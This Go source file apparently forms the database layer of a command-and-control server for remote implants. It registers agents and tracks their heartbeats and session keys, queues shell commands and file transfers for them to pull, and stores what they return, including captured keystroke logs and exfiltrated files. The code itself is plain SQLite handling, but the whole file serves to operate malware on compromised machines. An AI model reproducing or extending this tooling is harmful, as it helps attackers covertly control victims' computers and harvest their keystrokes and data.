package main

import (
	"database/sql"
	"encoding/json"
	"time"

	_ "modernc.org/sqlite"
)

var db *sql.DB

func openDB(path string) error {
	var err error
	db, err = sql.Open("sqlite", path)
	if err != nil {
		return err
	}

	db.SetMaxOpenConns(1) // SQLite serializes writes anyway

	schema := `
	CREATE TABLE IF NOT EXISTS agents (
		id TEXT PRIMARY KEY,
		first_seen INTEGER NOT NULL,
		last_seen INTEGER NOT NULL,
		session_key BLOB
	);

	CREATE TABLE IF NOT EXISTS tasks (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		agent_id TEXT NOT NULL,
		type TEXT NOT NULL,
		command TEXT DEFAULT '',
		path TEXT DEFAULT '',
		file_data TEXT DEFAULT '',
		destination TEXT DEFAULT '',
		status TEXT DEFAULT 'pending',
		created_at INTEGER NOT NULL
	);

	CREATE TABLE IF NOT EXISTS results (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		agent_id TEXT NOT NULL,
		type TEXT NOT NULL,
		data TEXT DEFAULT '',
		filename TEXT DEFAULT '',
		keylogs TEXT DEFAULT '',
		errors TEXT DEFAULT '',
		received_at INTEGER NOT NULL
	);
	`
	if _, err := db.Exec(schema); err != nil {
		return err
	}
	return nil
}

// --- Agents ---

func dbRegisterAgent(id string) {
	now := time.Now().Unix()
	db.Exec(`INSERT OR IGNORE INTO agents (id, first_seen, last_seen) VALUES (?, ?, ?)`,
		id, now, now)
}

func dbHeartbeatAgent(id string) {
	now := time.Now().Unix()
	db.Exec(`UPDATE agents SET last_seen = ? WHERE id = ?`, now, id)
}

func dbSetSessionKey(id string, key []byte) {
	db.Exec(`UPDATE agents SET session_key = ? WHERE id = ?`, key, id)
}

func dbGetSessionKey(id string) []byte {
	var key []byte
	row := db.QueryRow(`SELECT session_key FROM agents WHERE id = ?`, id)
	row.Scan(&key)
	return key
}

func dbAgentExists(id string) bool {
	var count int
	db.QueryRow(`SELECT COUNT(*) FROM agents WHERE id = ?`, id).Scan(&count)
	return count > 0
}

func dbListAgents() []Agent {
	rows, err := db.Query(`SELECT id, first_seen, last_seen FROM agents ORDER BY last_seen DESC`)
	if err != nil {
		return nil
	}
	defer rows.Close()

	var list []Agent
	for rows.Next() {
		var a Agent
		var fs, ls int64
		if err := rows.Scan(&a.ID, &fs, &ls); err != nil {
			continue
		}
		a.FirstSeen = time.Unix(fs, 0)
		a.LastSeen = time.Unix(ls, 0)
		list = append(list, a)
	}
	return list
}

// --- Tasks ---

func dbQueueTask(agentID string, task Task) {
	taskJSON, _ := json.Marshal(task)
	db.Exec(`INSERT INTO tasks (agent_id, type, command, path, file_data, destination, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)`,
		agentID, task.Type, task.Command, task.Path, task.FileData, task.Destination, time.Now().Unix())
	_ = taskJSON
}

func dbPopTask(agentID string) *Task {
	row := db.QueryRow(`SELECT id, type, command, path, file_data, destination FROM tasks WHERE agent_id = ? AND status = 'pending' ORDER BY id ASC LIMIT 1`, agentID)

	var t Task
	var taskID int64
	err := row.Scan(&taskID, &t.Type, &t.Command, &t.Path, &t.FileData, &t.Destination)
	if err != nil {
		return nil
	}

	db.Exec(`UPDATE tasks SET status = 'sent' WHERE id = ?`, taskID)
	return &t
}

// --- Results ---

func dbSaveResult(agentID string, res Result) {
	now := time.Now().Unix()
	errsJSON, _ := json.Marshal(res.Errors)
	db.Exec(`INSERT INTO results (agent_id, type, data, filename, keylogs, errors, received_at) VALUES (?, ?, ?, ?, ?, ?, ?)`,
		agentID, res.Type, res.Data, res.Filename, res.Keylogs, string(errsJSON), now)
}

func dbGetResults(agentID string) []Result {
	rows, err := db.Query(`SELECT type, data, filename, keylogs, errors FROM results WHERE agent_id = ? ORDER BY id ASC`, agentID)
	if err != nil {
		return nil
	}
	defer rows.Close()

	var list []Result
	for rows.Next() {
		var r Result
		var errsJSON string
		if err := rows.Scan(&r.Type, &r.Data, &r.Filename, &r.Keylogs, &errsJSON); err != nil {
			continue
		}
		json.Unmarshal([]byte(errsJSON), &r.Errors)
		list = append(list, r)
	}
	return list
}
